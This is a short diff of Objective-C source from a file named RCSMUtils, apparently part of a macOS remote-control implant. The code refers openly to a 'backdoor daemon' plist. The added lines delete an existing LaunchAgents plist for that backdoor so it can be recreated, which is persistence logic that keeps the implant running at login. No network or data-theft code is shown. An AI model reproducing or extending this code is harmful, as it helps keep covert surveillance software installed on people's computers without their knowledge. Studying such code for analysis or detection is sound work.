@@ -360,6 +360,15 @@ static RCSMUtils *sharedUtils = nil;
   NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
                         userHome,
                         BACKDOOR_DAEMON_PLIST];
+  if ([[NSFileManager defaultManager] fileExistsAtPath: ourPlist])
+    {
+#ifdef DEBUG_UTILS
+      warnLog(@"Launch Agents file exists, recreating");
+#endif
+      [[NSFileManager defaultManager] removeItemAtPath: ourPlist
+                                                 error: nil];
+    }
+
   NSString *launchAgentsPath = [NSString stringWithFormat: @"%@/Library/LaunchAgents",
            userHome];
 
